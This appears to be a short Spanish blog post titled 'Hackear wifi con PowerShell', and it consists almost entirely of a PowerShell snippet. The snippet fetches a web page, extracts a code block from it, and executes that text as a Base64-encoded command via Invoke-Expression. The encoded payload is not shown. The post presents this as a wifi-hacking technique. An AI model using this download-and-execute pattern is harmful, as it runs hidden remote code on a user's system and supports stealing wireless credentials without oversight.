# Hackear wifi con PowerShell (ejecutando un script remotamente codificado en Base64)
## PowerShell, Security, Wireless 
### URL: https://www.jesusninoc.com/2017/02/26/hackear-wifi-con-powershell-ejecutando-un-script-remotamente-codificado-en-base64/
```PowerShell
$url="https://www.jesusninoc.com/2017/01/24/hackear-wifi-con-powershell-script-codificado-en-base64/"
$result = Invoke-WebRequest $url
[String]$execute=$result.AllElements | Where class -eq 'crayon-pre' | %{$_.innerText}
Invoke-Expression "powershell -encodedcommand $execute"

```
